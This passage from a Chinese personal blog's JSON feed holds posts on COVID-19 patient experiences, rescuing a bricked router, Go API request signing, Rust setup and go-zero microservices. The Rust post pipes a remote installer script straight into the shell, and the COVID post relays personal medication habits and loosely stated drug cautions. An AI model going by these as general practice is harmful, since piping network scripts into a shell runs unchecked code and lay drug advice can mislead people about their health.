href=\"https://blog.csdn.net/qq_40989258/article/details/121862363\">https://blog.csdn.net/qq_40989258/article/details/121862363</a></p>\n",
            "tags": [
                "漏洞",
                "log4j2"
            ]
        },
        {
            "id": "https://erik.xyz/2022/12/16/in-guan-bingd-du/",
            "url": "https://erik.xyz/2022/12/16/in-guan-bingd-du/",
            "title": "新冠真就是流感而已么？我问了四个阳了的朋友。。。",
            "date_published": "2022-12-16T01:54:00.000Z",
            "content_html": "<p>这段时间，各地新冠感染人数都在暴增，<strong>大家出门记得戴口罩</strong>。</p>\n<p>这几天，咱编辑部也充满了风雨欲来的危机感，不过，办公室刚出现病例，咱们就迅速进行了一个居家办公，所以目前情况还不错。</p>\n<p>但即便如此，我们每天讨论最多的话题，仍然是新冠，不仅仅是编辑部，差评君在的大部分群聊里也是这个状况。</p>\n<p>“ 听说现在新冠跟流感一样了？”</p>\n<p>“ 抢到药了么？我咋到处买不到药？”</p>\n<p>“ 现在得新冠还会有啥后遗症么？”<br><span id=\"more\"></span><br>连花清瘟都快变 “ 硬通货 ” 了  ▼<br><img src=\"/img/202212/640.jpeg\" alt=\"erik.xyz\"></p>\n<p>随着开放，大家开始直面新冠，但大多数人对于新冠却还没有真正的了解，心里多少有一些担心。</p>\n<p>抱着一丝好奇，差评君翻阅了一些国内外的论文以及相关报道，并且抓着身边几位不幸中招的朋友们聊了一聊他们的「 新冠历程 」。</p>\n<p> 希望通过这篇文章，帮助大家迅速对新冠有个初步的了解。</p>\n<p>首先，<strong>还是先介绍下基本情况</strong>。</p>\n<p>从今年 1 月份开始，中国大部分地区流行的都是<strong>「 奥密克戎 」</strong>。</p>\n<p>不同地区流行的具体变异株不同，北京流行的变异株以 BF.7 为主，广州流行的以 BA 5.2 为主，它们都属于奥密克戎的不同分支，所以病毒毒性、致病力和传染性没有显著变化，<strong>不存在南北毒性不同，疾病表现不同可能是个体差异导致</strong>。</p>\n<p>至于那些 “ 丑的容易得，漂亮的不容易得 ” 的论调，要么咱听听就好<br> <img src=\"/img/202212/640.png\" alt=\"erik.xyz\"></p>\n<p>感染奥密克戎后主要是<strong>无症状</strong>和<strong>轻症</strong>。</p>\n<p>轻症的定义是：出现中低度发热、咽痛、鼻塞等上呼吸道感染症状，以及乏力、嗅（味）觉障碍等症状，但是没有肺炎表现。</p>\n<p> 所以，对于大部分人来说，奥密克戎并不可怕。</p>\n<p>但，注意，<strong>像老年人、有基础病的人、免疫力差的人</strong>容易出现重症。</p>\n<p>钟院士在内的多个专家表示，99% 的病人<strong>一周左右</strong>可以康复，而只要感染过，无论有无症状，3-6 个月内二次感染的概率极低。<br><img src=\"/img/202212/qwe21.png\" alt=\"erik.xyz\"></p>\n<p>这些数据看起来很生硬，<strong>所以差评君干脆联系了身边 4 位阳了的朋友，问了一下他们的生病感受</strong>。</p>\n<p>接下来是他们的讲述，为了方便阅读，差评君做了简单整理。</p>\n<h1 id=\"1-铁头-坐标北京\"><a href=\"#1-铁头-坐标北京\" class=\"headerlink\" title=\"1 铁头 坐标北京\"></a>1 铁头 坐标北京</h1><p>由于女朋友阳了，所以有预感自己也会。</p>\n<p>从开始到结束差不多是<strong>7天</strong>，第 1 天就嗓子微微不舒服，类似平时上火的感觉，有预感压不住第二天会发烧那种。</p>\n<p>第 2 天还是第 3 天开始，头晕发烧，不过这会测出来还是阴性，发烧 38.5°。</p>\n<p>接下来两三天一直在浑浑噩噩中度过，身上特别疼，就是健身后那种肌肉酸疼，咋待着都不舒服，感觉被打了一顿，脖子也疼，腰也疼，不能受力。</p>\n<p>后来就是比较常规的，咳嗽。</p>\n<p>到了第七天，就是嗓子什么有点不舒服。<br><img src=\"/img/202212/640qwe23.png\" alt=\"erik.xyz\"></p>\n<p>个人感受就是没啥食欲，每天没有胃口，就光喝水，也没有怎么吃药，全程就吃了一粒布洛芬。</p>\n<p>比较头疼的是，北京外卖很迟缓，可能是外卖员也都阳了吧，买点水，等一个小时，配送费是 30。</p>\n<p>建议就是拖时间 ，喝水，喝宝矿力，一定一定要多喝水。</p>\n<p>我对象比我先阳，也先好，现在已经开始上班了，整个生病的时间周期跟我差不多。<br><img src=\"/img/202212/342gfhhhhhhhht45.png\" alt=\"erik.xyz\"></p>\n<h1 id=\"2-导演-坐标北京\"><a href=\"#2-导演-坐标北京\" class=\"headerlink\" title=\"2 导演 坐标北京\"></a>2 导演 坐标北京</h1><p>我是上周日开始不舒服的，但是今天（周二）已经快好了。</p>\n<p>周日上午起来觉得身体有点迟钝，有点冷，腰酸脖子酸。吃完午饭就感觉自己快发烧了，下午直接烧到 39.5 度，来得很快。</p>\n<p>烧了估计有 24 个小时，都是接近 40 度，人基本也跟昏迷差不多了，除了喝水和躺着睡觉啥也干不了。<br><img src=\"/img/202212/dfg3415.png\" alt=\"erik.xyz\"></p>\n<p>周一下午开始有点退烧，到 38 度左右，开始能吃东西了。</p>\n<p>吃东西反正除了咸味，其他什么味道也吃不出来。朋友给我买了个黄桃罐头，吃那个味道还是有的。但是我吃饭时，刚咀嚼第一口整个口腔的肌肉特别酸痛，疼的嗷嗷叫。</p>\n<p>再之后就是烧开始慢慢退，但是身上的酸痛感也越来越严重，越来越普遍。</p>\n<p>今天起来（周二）彻底退烧，喉咙还有些疼，还有就是浑身像被人揍了一顿，稍微动一下就疼的厉害，不动也会疼，实在受不了了中午吃了颗布洛芬。</p>\n<p>今天吃了两顿饭，味觉基本恢复，大约下午 3 点多我感觉精神上也恢复得差不多了，身体虽然有点笨重，但不是很疼了，嗓子吞咽的时候稍稍有点感觉，但不明显，不良反应几乎是没有了。</p>\n<p>就感觉已经好的差不多可以继续打工了。。。<br><img src=\"/img/202212/123dfgyt55.png\" alt=\"erik.xyz\"></p>\n<h1 id=\"3-嘉嘉-坐标北京\"><a href=\"#3-嘉嘉-坐标北京\" class=\"headerlink\" title=\"3 嘉嘉 坐标北京\"></a>3 嘉嘉 坐标北京</h1><p>上周五睡觉的时候还正常的，周六凌晨突然烧的不行了，半夜被冻醒（实际是发烧），出汗出的衣服都湿透了，但还是感觉冷。</p>\n<p>没有体温计，不知道自己烧成啥也了，发烧之前就是感觉嗓子有点痒。</p>\n<p>从周六到现在（周二）就是头昏、咳嗽、恶心想吐以及流鼻涕，然后还有就是犯困，我没有全身疼。<br><img src=\"/img/202212/3678fh.png\" alt=\"erik.xyz\"></p>\n<p>我是一直有吃药的，拆开吃，疼就吃布洛芬，发热就连花清瘟，嗓子难受就头孢，一次吃一种，7小时后根据情况再吃（ 注，此处不构成医疗建议，仅为个人用药习惯 ），吃药的确会缓解一些难受。</p>\n<p>主要还是靠喝水吧，一天喝 4.5L 水，因为刚好是买的桶装水，所以水量特别清晰。</p>\n<p>生活没啥大影响，就是没有力气打游戏了，有人是吃东西没有味道，我是吃啥都觉得咸，麻辣烫就疯狂兑水。<br><img src=\"/img/202212/sfgr687.png\" alt=\"erik.xyz\"></p>\n<h1 id=\"4-徐哥-坐标广州\"><a href=\"#4-徐哥-坐标广州\" class=\"headerlink\" title=\"4 徐哥 坐标广州\"></a>4 徐哥 坐标广州</h1><p>自广州全面放开，大家似乎就也都放开了，我自己也有心理预期，觉得这事迟早要来，症状严重与否，纯粹看「 命 」，只不过没想到这么快。</p>\n<p>我是上周末开始的，目前第三天，整体对比网上相对轻微的。</p>\n<p>星期天白天嗓子略痒，但也不是很明显。到了晚上睡前全身酸痛无力、头很疼、全身发冷，广州盖了两床厚被子，穿了厚的秋衣裤，睡觉还是觉得冷。一整晚没怎么睡好。</p>\n<p>周一中午做了抗原，测出来阳了。这天的情况跟第一天一样，睡了一整天，吃不下饭，就啃了下馒头，有味的东西吃着就恶心。</p>\n<p>今天早上起来酸痛感、头疼感有舒缓，但下午感觉又严重了，但整体比第一天好，另外就是咳嗽、咳痰。</p>\n<p>目前为止还没发烧，所以吃药方面目前就是吃连花清瘟胶囊+消炎药，另外多喝水，泡 VC 泡腾片和电解质粉。<br><img src=\"/img/202212/werwe4389.png\" alt=\"erik.xyz\"></p>\n<p>以上就是他们的讲述。</p>\n<p>当然，这些个例不具有统计学意义，仅仅只是帮助大家了解一下如果你得了新冠，有可能会经历啥。</p>\n<p>接下来，也结合一些国外的论文，给大家聊聊<strong>「 再感染 」</strong>跟<strong>「 后遗症 」</strong>。</p>\n<p>根据英国官方的数据，奥密克戎的确会带来更多的再感染，在所有确定的再感染中，93.4% 发生在奥密克戎大流行期间。</p>\n<p>但，别着急，根据统计，<strong>只有不到 6.75% 的感染者发生了再感染</strong>。概率是很低的。<br><img src=\"/img/202212/fhtrry3455.png\" alt=\"erik.xyz\"></p>\n<p>一方面暴露在不同的毒株下，可能会重复感染，一方面即便是同一毒株上次感染形成的抗体浓度降低以后，也可能重复感染。<br><img src=\"/img/202212/sfer321.png\" alt=\"erik.xyz\"></p>\n<p> 关于「 后遗症 」，目前奥密克戎出现的时间太短，刚过一年，所以国内外对其后遗症的研究成果都比较有限。</p>\n<p>今年 5 月，有位印度学者研究了 53 位奥密克戎感染康复者，在这 53 位患者中，28.3% ，84.9% 和 56.6% 的人康复后分别经历了流鼻涕，发烧和喉咙痛，但是症状都没有持续超过两个月。</p>\n<p>根据@丁香园的报道，有研究指出奥密克戎毒株后遗症发生率仅是 Delta 毒株的 24～50%（接种疫苗的情况下）。由于该数据截至 2021 年末，当时还未进入奥密克戎大流行，目前以奥密克戎感染为主的情况下，新冠后遗症比例可能比研究中呈现的更低。</p>\n<p>最后，简单聊下，大家可以做一些什么预防新冠呢？</p>\n<p>勤洗手这些都算是老调常谈了，此外好好休息，可以考虑常备一些药物在家，具体的药物建议，可以参考人民日报发布的《<strong>新冠病毒感染者用药目录</strong>》。<br><img src=\"/img/202212/dgfgh67868.png\" alt=\"erik.xyz\"></p>\n<p>这里只强调一点，<strong>不要 “ 病急乱投医 ”，避免重复用药、超剂量用药等情况</strong>。</p>\n<p>举个栗子，很多人可能同时备有乙酰氨基酚跟布洛芬，这两种药尽量不要同时使用，否则有一定可能导致急性肝衰竭。再比如使用布洛芬退烧的时候，需要每次间隔 6 小时，等等。</p>\n<p> 用药禁忌可以查看北京协和医院等权威医疗机构发布的信息。</p>\n<p>其他的一些基本事项，可以参考官方《<strong>新冠病毒感染者居家指引</strong>》。<br><img src=\"/img/202212/qwe76867.png\" alt=\"erik.xyz\"><br><img src=\"/img/202212/fghgffffffft7686.png\" alt=\"erik.xyz\"></p>\n<p>基本上相关信息网络上都能获取，大家注意找权威、靠谱的信息来源就行。</p>\n<p>最后，多喝热水。。。</p>\n<font color=red>\n备注：\n1. 本文只是一个帮助大家了解新冠的窗口，不构成任何医疗建议。\n2. 尽管对于大多数人来说，新冠并不可怕，但个体免疫力有差异，一旦病情严重，务必及时就医。\n  </font>\n\n\n<p>  转载自：<a href=\"https://mp.weixin.qq.com/s/hpheu-C8ZiwyCuI9GdSTQA\">https://mp.weixin.qq.com/s/hpheu-C8ZiwyCuI9GdSTQA</a></p>\n",
            "tags": [
                "转载",
                "杂录",
                "新冠肺炎"
            ]
        },
        {
            "id": "https://erik.xyz/2022/12/14/shao-lu-luyouqi/",
            "url": "https://erik.xyz/2022/12/14/shao-lu-luyouqi/",
            "title": "如何把极路由从砖头变正常  ",
            "date_published": "2022-12-14T00:41:00.000Z",
            "content_html": "<p>家里有一个闲置的极路由2，试试刷个openwrt，结果一不小心刷成砖头了。开机不能通电，没有指示灯亮。本来想着就这样丢了，再弄个查查咸鱼，二手的都要100多。果断找找解决办法。找这篇文章<a href=\"https://www.ddmzf.cn/202203155.html\">极路由X编程器救砖教程编程器刷PandoraBox</a>，根据这篇文章，到万能的淘宝买了CH341A编程器 + 烧录夹<br><span id=\"more\"></span></p>\n<p><img src=\"/img/202212/20221214084856.jpg\" width = \"500\" height = \"400\" alt=\"erik.xyz\" align=center /></p>\n<p>价格还是合理的。东西一道就开始拆路由器，螺丝真的是奇葩，搞了好久才拆下来。</p>\n<p><img src=\"/img/202212/20221214085342.jpg\" width = \"500\" height = \"200\" alt=\"erik.xyz\" align=center /></p>\n<p>然后在网上搜索CH341A编程器烧录软件。把下载的软件包解压。</p>\n<p>1.先安装驱动<br>打开-编程器驱动手动安装文件夹<br><img src=\"/img/202212/1.png\" alt=\"erik.xyz\"></p>\n<p>2.打开<br><img src=\"/img/202212/2.png\" alt=\"erik.xyz\"></p>\n<p>3.点击安装<br><img src=\"/img/202212/3.png\" alt=\"erik.xyz\"></p>\n<p>4.提示驱动安装成功<br><img src=\"/img/202212/4.png\" alt=\"erik.xyz\"><br> *TTL驱动安装也一样</p>\n<p>5.打开软件文件夹<br><img src=\"/img/202212/5.png\" alt=\"erik.xyz\"></p>\n<p>6.打开CH341A.exe程序 插上编程器<br><img src=\"/img/202212/6.png\" alt=\"erik.xyz\"></p>\n<p>7.软件右下角显示已连接说明驱动安装成功<br><img src=\"/img/202212/7.png\" alt=\"erik.xyz\"></p>\n<p>8.用我买的CH341A编程器安装一下<br><img src=\"/img/202212/254879.webp\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/202212/345517.webp\" alt=\"erik.xyz\"></p>\n<p>9.按软件检测按钮 检测不到或者型号不一致  就手动选择你的型号       显示检测到芯片25T80<br><img src=\"/img/202212/8.png\" alt=\"erik.xyz\"></p>\n<p>芯片识别正常之后，我们依次进行上方按钮的操作： 擦除 – 查空 – 打开 – 选择文件”HC5761A-sysupgrade-20170606-abe3b35e.bin“ – 编程 – 效验</p>\n<p><img src=\"/img/202212/20221214091336.jpg\" alt=\"erik.xyz\"></p>\n",
            "tags": [
                "路由器烧录",
                "烧录",
                "极路由2烧录",
                "砖头烧录"
            ]
        },
        {
            "id": "https://erik.xyz/2022/11/16/open-api-on/",
            "url": "https://erik.xyz/2022/11/16/open-api-on/",
            "title": "对外开放接口开发",
            "date_published": "2022-11-16T02:33:00.000Z",
            "content_html": "<p>需求是这样的：<br>有个外部app给我们小程序做推广，在他们那领取优惠券码。然后到我们小程序领取优惠券，使用优惠券下单。同时，需要我们推送订单。还要接受他们那变更优惠券的状态。<br><span id=\"more\"></span><br>思路图如下：<br><img src=\"/img/202211/20221116094358.jpg\" alt=\"思路图\" title=\"思路图\"></p>\n<p>那么，根据上面的思路。我这需要开发三个接口</p>\n<p>1.优惠券列表</p>\n<p>第三方调用接口，获取优惠券信息</p>\n<p>2.优惠券状态变更</p>\n<p>第三方调用变更优惠券状态</p>\n<p>3.优惠券订单推送</p>\n<p>第三方提供url，我这边根据使用优惠券产生的订单来推送订单信息</p>\n<p>首先，设计一个开放应用表，主要存储应用id、应用秘钥，如图</p>\n<p><img src=\"/img/202211/20221116102006.jpg\" alt=\"应用表设计\" title=\"应用表设计\"></p>\n<p>要给数据做个签名以及重要数据做加密处理</p>\n<p>签名就用常规的格式（也可以自己改动格式）:时间戳+应用秘钥+传输数据<br>按照上面的格式md5一下，然后再转码成base64。时间戳和签名要放在请求头传输。如图</p>\n<p><img src=\"/img/202211/20221116102258.jpg\" alt=\"签名代码\" title=\"签名代码\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func CouponSigin(appId, jsonData string, sid int, def ...string) (*string, *string, *string, error) &#123;</span><br><span class=\"line\">    openApp, err := GetStoreApp(appId, sid, 0)</span><br><span class=\"line\">    if err != nil &#123;</span><br><span class=\"line\">        logs.Error(&quot;获取应用失败&quot;, err)</span><br><span class=\"line\">        return nil, nil, nil, err</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    apiKey := openApp.ApiOne</span><br><span class=\"line\">    getTime := Util.Int64ToString(time.Now().UnixNano())</span><br><span class=\"line\">    if len(def) &gt; 0 &amp;&amp; len(def[0]) &gt; 0 &#123;</span><br><span class=\"line\">        getTime = def[0]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    strData := getTime + apiKey + jsonData + getTime</span><br><span class=\"line\">    md := md5.New()</span><br><span class=\"line\">    md.Write([]byte(strData))</span><br><span class=\"line\">    md5Str := hex.EncodeToString(md.Sum(nil))</span><br><span class=\"line\">    SystemSign := base64.StdEncoding.EncodeToString([]byte(md5Str))</span><br><span class=\"line\">    logs.Error(&quot;==签名==&quot;, SystemSign)</span><br><span class=\"line\">    logs.Error(&quot;==时间戳==&quot;, getTime)</span><br><span class=\"line\">    return &amp;SystemSign, &amp;getTime, &amp;apiKey, nil</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>加解密就用常规的aes加密，自己用应用秘钥加密，这里不多讲了，很常见的。</p>\n<p>到这里基础弄好了。</p>\n<p>我们开发优惠券列表、变更优惠券状态、推送优惠券订单就可以通过签名校验数据，同时敏感数据就加密</p>\n",
            "tags": [
                "go",
                "开放接口开发"
            ]
        },
        {
            "id": "https://erik.xyz/2022/09/15/rust-dev-test/",
            "url": "https://erik.xyz/2022/09/15/rust-dev-test/",
            "title": "初识rust语言",
            "date_published": "2022-09-15T12:51:00.000Z",
            "content_html": "<p>去年在刷招聘网站的时候，偶然认识了rust开发语言，留了个心眼，刚好这段时间不太忙，就先初步认识一下。</p>\n<p>官方网站是这样介绍的：<br>一个赋予每个人构建可靠且高效软件能力的语言。<br><span id=\"more\"></span><br>首先，本地安装环境</p>\n<p>我的是linux系统，就执行下面的命令<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --proto &#x27;=https&#x27; --tlsv1.3 https://sh.rustup.rs -sSf | sh</span><br></pre></td></tr></table></figure></p>\n<p>安装好后，在命令窗口输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rustc -V</span><br></pre></td></tr></table></figure>\n<p>你就会看到</p>\n<p><img src=\"/img/202209/20221116105814.jpg\" alt=\"\"></p>\n<p>表示安装成功了</p>\n<p>安装成的同时也会安装cargo</p>\n<p>Cargo 是 Rust 的构建系统和包管理器。大多数 Rustacean 们使用 Cargo 来管理他们的 Rust 项目，因为它可以为你处理很多任务，比如构建代码、下载依赖库并编译这些库</p>\n<p>如果你在终端任意位置输入rust -V或cargo —version没有响应，那就是你需要把安装好的这个两个命令软连接到/usr/local/bin或/usr/bin中，这样才能全局使用。</p>\n<p>至此rust环境配置好了。</p>\n<p>接下来通过<a href=\"https://kaisery.github.io/trpl-zh-cn/ch02-00-guessing-game-tutorial.html\">文档</a>来开发一个猜数字小游戏，代码如下<br><img src=\"/img/202209/20221116110422.jpg\" alt=\"\"></p>\n<p>最后的成品效果<br><img src=\"/img/202209/20221116110639.jpg\" alt=\"\"></p>\n",
            "tags": [
                "rust",
                "rust配置"
            ]
        },
        {
            "id": "https://erik.xyz/2022/08/09/go-zero-list-1/",
            "url": "https://erik.xyz/2022/08/09/go-zero-list-1/",
            "title": "go-zero微服务试用",
            "date_published": "2022-08-09T13:48:00.000Z",
            "content_html": "<p>参考地址：<a href=\"https://go-zero.dev/cn/docs/quick-start/micro-service#%E5%88%9B%E5%BB%BAuser-rpc%E6%9C%8D%E5%8A%A1\">https://go-zero.dev/cn/docs/quick-start/micro-service#%E5%88%9B%E5%BB%BAuser-rpc%E6%9C%8D%E5%8A%A1</a></p>\n<h4 id=\"go-zero介绍\"><a href=\"#go-zero介绍\" class=\"headerlink\" title=\"go-zero介绍\"></a>go-zero介绍</h4><p>go-zero（收录于 CNCF 云原生技术全景图：<a href=\"https://landscape.cncf.io/?selected=go-zero）是一个集成了各种工程实践的\">https://landscape.cncf.io/?selected=go-zero）是一个集成了各种工程实践的</a> web 和 rpc 框架。通过弹性设计保障了大并发服务端的稳定性，经受了充分的实战检验。<br><span id=\"more\"></span><br>go-zero 包含极简的 API 定义和生成工具 goctl，可以根据定义的 api 文件一键生成 Go, iOS, Android, Kotlin, Dart, TypeScript, JavaScript 代码，并可直接运行。</p>\n<p>使用 go-zero 的好处：</p>\n<ul>\n<li>轻松获得支撑千万日活服务的稳定性</li>\n<li>内建级联超时控制、限流、自适应熔断、自适应降载等微服务治理能力，无需配置和额外代码</li>\n<li>微服务治理中间件可无缝集成到其它现有框架使用</li>\n<li>极简的 API 描述，一键生成各端代码</li>\n<li>自动校验客户端请求参数合法性</li>\n<li>大量微服务治理和并发工具包</li>\n</ul>\n<p>1.根据官方文档快速创建微服务<br>我们首先在go项目目录创建go-zero-demo</p>\n<pre><code>  mkdir go-zero-demo\n  cd go-zero-demo\n  go mod init go-zero-demo\n</code></pre><p>2.创建user rpc服务</p>\n<p>2.1创建user rpc目录</p>\n<pre><code> mkdir -p mall/user/rpc\n</code></pre><p>2.2添加user.proto文件，增加getUser方法</p>\n<pre><code>vim mall/user/rpc/user.proto\n</code></pre><p>2.3增加如下代码：</p>\n<pre><code>    syntax = &quot;proto3&quot;;\n    package user;\n    // protoc-gen-go 版本大于1.4.0, proto文件需要加上go_package,否则无法生成\n    option go_package = &quot;./user&quot;;\n    message IdRequest &#123;\n        string id = 1;\n    &#125;\n    message UserResponse &#123;\n      // 用户id\n      string id = 1;\n      // 用户名称\n      string name = 2;\n      // 用户性别\n      string gender = 3;\n    &#125;\n    service User &#123;\n        rpc getUser(IdRequest) returns(UserResponse);\n    &#125;\n</code></pre><p>2.4生成代码 </p>\n<pre><code>  cd mall/user/rpc\n  goctl rpc protoc user.proto --go_out=./types --go-grpc_out=./types --zrpc_out=.\n</code></pre><p><img src=\"/img/202208/zero1.png\" alt=\"\"></p>\n<p>2.5填充业务逻辑</p>\n<pre><code> vim internal/logic/getuserlogic.go\n\n\npackage logic\nimport (\n  &quot;context&quot;\n  &quot;go-zero-demo/mall/user/rpc/internal/svc&quot;\n  &quot;go-zero-demo/mall/user/rpc/types/user&quot;\n  &quot;github.com/zeromicro/go-zero/core/logx&quot;\n)\ntype GetUserLogic struct &#123;\n  ctx context.Context\n  svcCtx *svc.ServiceContext\n  logx.Logger\n&#125;\nfunc NewGetUserLogic(ctx context.Context, svcCtx *svc.ServiceContext) *GetUserLogic &#123;\n  return &amp;GetUserLogic&#123;\n  ctx: ctx,\n  svcCtx: svcCtx,\n  Logger: logx.WithContext(ctx),\n  &#125;\n&#125;\nfunc (l *GetUserLogic) GetUser(in *user.IdRequest) (*user.UserResponse, error) &#123;\n  return &amp;user.UserResponse&#123;\n  Id: &quot;1&quot;,    \n  Name: &quot;test&quot;,\n  &#125;, nil\n&#125;\n</code></pre><p>3创建order api服务#</p>\n<p>3.1创建 order api目录</p>\n<p>回到 go-zero-demo/mall 目录</p>\n<pre><code>mkdir -p order/api &amp;&amp; cd order/api\n</code></pre><p>3.1添加api文件</p>\n<pre><code> vim order.api\n\n\ntype(\n  OrderReq &#123;\n      Id string `path:&quot;id&quot;`\n  &#125;\n  OrderReply &#123;\n      Id string `json:&quot;id&quot;`\n      Name string `json:&quot;name&quot;`\n  &#125;\n)\nservice order &#123;\n  @handler getOrder\n  get /api/order/get/:id (OrderReq) returns (OrderReply)\n&#125;\n</code></pre><p>3.2生成order服务</p>\n<pre><code> goctl api go -api order.api -dir .\n</code></pre><p><img src=\"/img/202208/zero2.png\" alt=\"\"></p>\n<p>3.3添加user rpc配置</p>\n<pre><code> vim internal/config/config.go\n</code></pre><p>补充内容</p>\n<pre><code>package config\nimport (\n  &quot;github.com/zeromicro/go-zero/zrpc&quot;\n  &quot;github.com/zeromicro/go-zero/rest&quot;\n)\n\ntype Config struct &#123;\n  rest.RestConf\n  UserRpc zrpc.RpcClientConf\n&#125;\n</code></pre><p>3.4添加yaml配置</p>\n<pre><code> vim etc/order.yaml \n\n\nName: order\nHost: 0.0.0.0\nPort: 8888\nUserRpc:\nEtcd:\nHosts:\n- 127.0.0.1:2379\nKey: user.rpc\n</code></pre><p>3.5完善服务依赖<br>这里官方文档用的是user，我本地使用发现生成的代码没有user只有userclient极有可能是官方文档未及时更新。</p>\n<pre><code>vim internal/svc/servicecontext.go\n</code></pre><p> 补充内容</p>\n<pre><code>package svc\n\nimport (\n\n&quot;go-zero-demo/mall/order/api/internal/config&quot;\n&quot;go-zero-demo/mall/user/rpc/userclient&quot;\n&quot;github.com/zeromicro/go-zero/zrpc&quot;\n)\ntype ServiceContext struct &#123;\nConfig config.Config\nUserRpc userclient.User\n&#125;\nfunc NewServiceContext(c config.Config) *ServiceContext &#123;\nreturn &amp;ServiceContext&#123;\nConfig: c,\nUserRpc: userclient.NewUser(zrpc.MustNewClient(c.UserRpc)),\n&#125;\n&#125;\n</code></pre><p>3.6给 getorderlogic 添加业务逻辑</p>\n<pre><code>vim internal/logic/getorderlogic.go\n</code></pre><p>补充内容</p>\n<pre><code>package logic\nimport (\n  &quot;context&quot;\n  &quot;errors&quot;\n  &quot;go-zero-demo/mall/order/api/internal/svc&quot;\n  &quot;go-zero-demo/mall/order/api/internal/types&quot;\n  &quot;go-zero-demo/mall/user/rpc/types/user&quot;\n  &quot;github.com/zeromicro/go-zero/core/logx&quot;\n)\n\ntype GetOrderLogic struct &#123;\n  logx.Logger\n  ctx context.Context\n  svcCtx *svc.ServiceContext\n&#125;\n\nfunc NewGetOrderLogic(ctx context.Context, svcCtx *svc.ServiceContext) GetOrderLogic &#123;\n    return GetOrderLogic&#123;\n    Logger: logx.WithContext(ctx),\n    ctx: ctx,\n    svcCtx: svcCtx,\n    &#125;\n&#125;\n\nfunc (l *GetOrderLogic) GetOrder(req *types.OrderReq) (*types.OrderReply, error) &#123;\n    user, err := l.svcCtx.UserRpc.GetUser(l.ctx, &amp;user.IdRequest&#123;\n    Id: &quot;1&quot;,\n    &#125;)\n\n    if err != nil &#123;\n    return nil, err\n    &#125;\n    if user.Name != &quot;test&quot; &#123;\n    return nil, errors.New(&quot;用户不存在&quot;)\n    &#125;\n\n    return &amp;types.OrderReply&#123;\n    Id: req.Id,\n    Name: &quot;test order&quot;,\n    &#125;, nil\n\n&#125;\n</code></pre><p>4.启动服务并验证#</p>\n<p>4.1启动etcd<br>这里没有etcd服务需要自己安装</p>\n<pre><code> etcd\n</code></pre><p>4.2下载依赖</p>\n<p> 在 go-zero-demo 目录下</p>\n<pre><code> go mod tidy\n</code></pre><p>4.3启动user rpc</p>\n<p> 在 mall/user/rpc 目录</p>\n<pre><code> go run user.go -f etc/user.yaml\n</code></pre><p>如果出现以下错误，就是没有启动etcd<br><img src=\"/img/202208/zero3.png\" alt=\"\"></p>\n<p>4.4启动order api</p>\n<p> 在 mall/order/api 目录</p>\n<pre><code> go run order.go -f etc/order.yaml\n</code></pre><p><img src=\"/img/202208/zero4.png\" alt=\"\"></p>\n<p>4.5访问order api</p>\n<pre><code> curl -i -X GET http://localhost:8888/api/order/get/1\n</code></pre><p><img src=\"/img/202208/zero5.png\" alt=\"\"></p>\n",
            "tags": [
                "微服务",
                "go-zero",
                "rpc"
            ]
        }
    ]
}